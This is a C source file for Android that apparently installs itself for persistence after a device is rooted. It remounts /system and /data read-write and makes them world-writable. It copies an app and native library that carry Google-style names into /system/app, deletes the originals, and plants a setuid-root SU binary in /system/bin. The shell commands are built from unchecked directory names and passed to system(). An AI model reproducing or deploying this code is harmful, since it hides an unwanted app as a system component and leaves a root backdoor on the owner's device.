#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <stdio.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>
#include "public.h"

char __aeabi_unwind_cpp_pr0[0];

#define ROOT_TEST_FILENAME "/system/bin/GoogleServiceRootTest.txt"
#define APP_PATH_KEY_NAME 	"com.google.android.apps.plus"
#define LIB_KEY_NAME 		"libGoogleServiceRoot.so"
#define LOG_TAG 			"systemApp"
#define LOGV(...) { __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }




/*
#include <time.h>
int writeLog(const char * plog){
	FILE * file = fopen("/data/data/com.GoogleService/files/roottest.txt","a");
	if(file <= 0){
		file = fopen("/data/data/com.GoogleService/files/roottest.txt","w");
		if(file <= 0){
			return -1;
		}
	}

	time_t time_seconds = time(0);
	struct tm* now_time = localtime(&time_seconds);
	char szdatetime[256] = {0};
	int timelen = sprintf(szdatetime,"%d-%d-%d %d:%d:%d ", now_time->tm_year + 1900, now_time->tm_mon + 1,
	now_time->tm_mday, now_time->tm_hour, now_time->tm_min,now_time->tm_sec);

	size_t len = fwrite(szdatetime,strlen(szdatetime),1,file);

	len = fwrite(plog,strlen(plog),1,file);
	fclose(file);
	return 0;
}
*/

int isDirRooted (char *filename){

	FILE * fp = fopen(filename,"w");
	if(fp <= 0){
		//__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"isDirRooted fopen error");
		printf("isDirRooted fopen error\r\n");
	  return -1;
	}

	char szroot[] = "hello root!\r\n";
	int writesize = fwrite(szroot,1,strlen(szroot),fp);
	fclose(fp);
	if(writesize != strlen(szroot)){
		//__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"isDirRooted fwrite error");
		printf("isDirRooted fwrite error\r\n");
	  return -1;
	}

	return 0;
}


int findAppPath( const char * dir_name,char * subpath,char * dstpathname,int isfullpath)
{
	DIR *dir;
	struct dirent *ptr;
	char folder[256] = {0};
	int ret = -1;

	if ((dir=opendir(dir_name)) == NULL)
	{
		printf("findAppPath Open dir error:%s\r\n",dir_name);
		perror("reason:");
		return ret;
	}

	while ((ptr=readdir(dir)) != NULL)
	{
		if(ptr->d_type == 8){
			//printf("file:%s/%s\n",dir_name,ptr->d_name);
		}
		else if(ptr->d_type == 4)
		{
			if( strcmp(ptr->d_name,"..") == 0 || strcmp(ptr->d_name,".") == 0){
				continue;
			}
			else if(strstr(ptr->d_name,subpath) > 0){
				if(isfullpath > 0){
					strcpy(dstpathname,dir_name);
					strcat(dstpathname,ptr->d_name);
					strcat(dstpathname,"/");
				}else{
					strcpy(dstpathname,ptr->d_name);
				}
				printf("find dir:%s\r\n",dstpathname);
				return 0;
			}else{
				strcpy(folder,dir_name);
				strcat(folder,ptr->d_name);
				strcat(folder,"/");
				findAppPath(folder,subpath,dstpathname,isfullpath);
			}
		}
	}
	closedir(dir);
	return -1;
}


int findAppFile( char * pathname,const char * subfilename,char * dstfilename,int isfullpath)
{
	DIR *dir;
	struct dirent *ptr;
	char folder[256] = {0};

	if ((dir=opendir(pathname)) == NULL)
	{
		printf("findAppFile Open dir error:%s\r\n",pathname);
		perror("reason:");
		return -1;
	}

	while ((ptr=readdir(dir)) != NULL)
	{
		if(ptr->d_type == 8){
			if(strstr(ptr->d_name,subfilename) > 0){
				if(isfullpath){
					strcpy(dstfilename,pathname);
					strcat(dstfilename,ptr->d_name);
				}else{
					strcpy(dstfilename,ptr->d_name);
				}
				printf("find file:%s\r\n",dstfilename);
				return 0;
			}
		}
		else if(ptr->d_type == 4)
		{
			if( strcmp(ptr->d_name,"..") == 0 || strcmp(ptr->d_name,".") == 0){
				continue;
			}else{
				strcpy(folder,pathname);
				strcat(folder,ptr->d_name);
				strcat(folder,"/");
				findAppFile(folder,subfilename,dstfilename,isfullpath);
			}
		}
	}
	closedir(dir);
	return -1;
}



int getPartmentFromMount(char * lpmountinfo,int infosize,char * seperator,char * lpname){
	char * pos = strstr(lpmountinfo,seperator);
	if(pos == 0){
		printf("can not find system department\r\n");
		return -1;
	}

	char * hdr = pos;
	for(; hdr > lpmountinfo; hdr --){
		if(*hdr == 0x0a){
			hdr ++;

			memmove(lpname,hdr,pos - hdr);
			return 0;
		}
	}


	/*
	char * end = pos;
	for(; end < lpmountinfo + infosize; end ++){
		if(*end == 0x0a){
			memmove(lpname,hdr,end - hdr);
			return 0;
		}
	}
	*/

	return -1;
}



int moveAppIntoSystem(){

	/*
	char outputfile[] = "/data/data/com.GoogleService/files/mountinfo.txt";
	//char outputfile[] = "/data/local/tmp/mountinfo.txt";
	char mountcmd[256];
	sprintf(mountcmd,"mount > %s",outputfile);
	printf("mount command:%s\r\n",mountcmd);

	system(mountcmd);
	char chmodinfo[256];
		sprintf(chmodinfo,"chmod 777 %s",outputfile);
	system(chmodinfo);

	int fd = open(outputfile,O_RDONLY);
	if(fd <= 0){
		printf("open error\r\n");
		return -1;
	}

	struct stat filestate;
	int ret = fstat(fd,&filestate);
	if(ret == -1){
		close(fd);
		printf("fstat error\r\n");
		return -1;
	}

	char lpmountinfo[0x1000] = {0};
	int readsize = read(fd,lpmountinfo,filestate.st_size);
	if(readsize != filestate.st_size){
		close(fd);
		printf("read error\r\n");
		return -1;
	}
	close(fd);

	char dataname[256] = {0};
	getPartmentFromMount(lpmountinfo,filestate.st_size," /data ",dataname);
	char datamountcmd[256];
	sprintf(datamountcmd,"mount -o remount,rw %s",dataname);
	printf("data depart remount command:%s\r\n",datamountcmd);

	char sysname[256] = {0};
	getPartmentFromMount(lpmountinfo,filestate.st_size," /system ",sysname);
	char sysmountcmd[256];
	sprintf(sysmountcmd,"mount -o remount,rw %s",sysname);
	printf("system depart remount command:%s\r\n",sysmountcmd);

	system(datamountcmd);
	system(sysmountcmd);
	*/

	system("mount -o remount,rw /");
	system("mount -o remount,rw /system");	//not /system/
	system("mount -o remount,rw /data");	//not /data/
	system("chmod 777 /system/");
	system("chmod 777 /data/");

	int result = isDirRooted(ROOT_TEST_FILENAME);
	if(result){
		printf("root failed to write file into %s\r\n",ROOT_TEST_FILENAME);
		return -1;
	}else{
		printf("root ok to write file into %s\r\n",ROOT_TEST_FILENAME);
	}

	char appfullpath[256] = {0};
	result = findAppPath("/data/app/",APP_PATH_KEY_NAME,appfullpath,1);
	if(*appfullpath == 0 ){
		char appfullname[256] = {0};
		result = findAppFile("/data/app/",APP_PATH_KEY_NAME,appfullname,1);
		if(*appfullname == 0){
			printf("not found app\r\n");
			return -1;
		}else{
			printf("find appfullname:%s\r\n",appfullname);

			char libfullname[256] = {0};
			result = findAppFile("/data/app-lib/",LIB_KEY_NAME,libfullname,1);
			if(*libfullname == 0){
				return -1;
			}
			printf("find libfullname:%s\r\n",libfullname);

			char libname[256] = {0};
			result = findAppFile("/data/app-lib/",LIB_KEY_NAME,libname,0);
			if(*libname == 0){
				return -1;
			}
			printf("find libname:%s\r\n",libname);


			char libuppath[256] = {0};
			result = findAppPath("/data/app-lib/",APP_PATH_KEY_NAME,libuppath,0);
			if(*libuppath == 0){
				return -1;
			}
			printf("find libuppath:%s\r\n",libuppath);


			//char newlibfile[256] = {0};
			//sprintf(newlibfile,"/system/lib/%s",libname);
			//writeLog(newlibfile);

			char appname[256] = {0};
			int result = findAppFile("/data/app/",APP_PATH_KEY_NAME,appname,0);
			if(*appname == 0 ){
				return -1;
			}
			printf("find appname:%s\r\n",appname);


			char szcatapk[1024] = {0};
			sprintf(szcatapk,"cat %s > /system/app/%s",appfullname,appname);
			system(szcatapk);
			printf("cat command:%s\r\n",szcatapk);


			char szchmodapp[256];
			sprintf(szchmodapp,"chmod 777 /system/app/%s",appname);
			system(szchmodapp);


			char szcatlib[1024];
			sprintf(szcatlib,"cat %s > /system/lib/%s",libfullname,libname);
			system(szcatlib);
			printf("cat command:%s\r\n",szcatlib);

			//chmod -R µÄÓÃ·¨
			char szchmodlib[256];
			sprintf(szchmodlib,"chmod 777 /system/lib/%s",libname);
			system(szchmodlib);

			char szdelapp[256];
			sprintf(szdelapp,"rm -rf %s",appfullname);
			system(szdelapp);
			printf("rm command:%s\r\n",szdelapp);

			char szdelapplib[256];
			sprintf(szdelapplib,"rm -rf /data/app-lib/%s",libuppath);
			system(szdelapplib);
			printf("rm command:%s\r\n",szdelapplib);

			//char szdeldatadata[256];
			//sprintf(szdeldatadata,"rm -rf /data/data/%s",APP_PATH_KEY_NAME);
			//system(szdeldatadata);
			//printf("rm command:%s\r\n",szdeldatadata);
			return 0;
		}
	}else{
		printf("find appfullpath:%s\r\n",appfullpath);

		char apppath[256] = {0};
		int result = findAppPath("/data/app/",APP_PATH_KEY_NAME,apppath,0);
		if(*apppath == 0 ){
			return -1;
		}
		printf("find apppath:%s\r\n",apppath);

		char szmkdir[256];
		sprintf(szmkdir,"mkdir -p /system/app/%s/lib/arm/",apppath);
		system(szmkdir);
		printf("mkdir command:%s\r\n",szmkdir);

		char appfullname[256] = {0};
		result = findAppFile(appfullpath,".apk",appfullname,1);
		if(*appfullname == 0){
			return -1;
		}
		printf("find appfullname:%s\r\n",appfullname);

		char appname[256] = {0};
		result = findAppFile(appfullpath,".apk",appname,0);
		if(*appname == 0 ){
			return -1;
		}
		printf("find appname:%s\r\n",appname);

		char szcatapk[1024] = {0};
		sprintf(szcatapk,"cat %s > /system/app/%s/%s",appfullname,apppath,appname);
		system(szcatapk);
		printf("cat command:%s\r\n",szcatapk);

		char szchmodapp[256];
		sprintf(szchmodapp,"chmod 777 /system/app/%s/%s",apppath,appname);
		system(szchmodapp);

		printf("chmod command:%s\r\n",szchmodapp);

		char libfullname[256] = {0};
		result = findAppFile(appfullpath,LIB_KEY_NAME,libfullname,1);
		if(*libfullname == 0){
			return -1;
		}
		printf("find libfullname:%s\r\n",libfullname);

		char libname[256] = {0};
		result = findAppFile(appfullpath,LIB_KEY_NAME,libname,0);
		if(*libname == 0){
			return -1;
		}
		printf("find libname:%s\r\n",libname);

		char szcatlib[256];
		sprintf(szcatlib,"cat %s > /system/app/%s/lib/arm/%s",libfullname,apppath,libname);
		system(szcatlib);
		printf("cat command:%s\r\n",szcatlib);

		char szchmodlib[256];
		sprintf(szchmodlib,"chmod 777 /system/app/%s/lib/arm/%s",apppath,libname);
		system(szchmodlib);
		printf("chmod command:%s\r\n",szchmodlib);

		char szappfoldermode[256];
		sprintf(szappfoldermode,"chmod 777 /system/app/%s",apppath);
		system(szappfoldermode);

		sprintf(szappfoldermode,"chmod 777 /system/app/%s/lib/",apppath);
		system(szappfoldermode);

		sprintf(szappfoldermode,"chmod 777 /system/app/%s/lib/arm/",apppath);
		system(szappfoldermode);

		printf("chmod command:%s\r\n",szappfoldermode);
		//sprintf(szappfoldermode,"chmod 777 /system/app/%s",apppath);
		//system(szappfoldermode);
		//sprintf(szappfoldermode,"/system/app/%s",apppath);
		//chmod(szappfoldermode,0777);

		//char szcatfolder[1024];
		//sprintf(szcatfolder,"mv %s /system/app/%s/",appfullpath,apppath);
		//system(szcatfolder);
		//printf("mv command:%s\r\n",szcatfolder);

		char szdeldataapp[256];
		sprintf(szdeldataapp,"rm -rf /data/app/%s",apppath);
		system(szdeldataapp);
		printf("rm command:%s\r\n",szdeldataapp);

		return 0;
	}
}


int makeSUIntoSystem(){
	system("mount -o remount,rw /");
	system("mount -o remount,rw /system");
	system("chmod 777 /system");
	system("cat /data/data/com.google.android.apps.plus/files/SU > /system/bin/SU");
	system("chown root:root /system/bin/SU");
	system("chmod 6755 /system/bin/SU");
	system("chmod 755 /system");
	system("mount -o remount,ro /system");
	return 0;
}




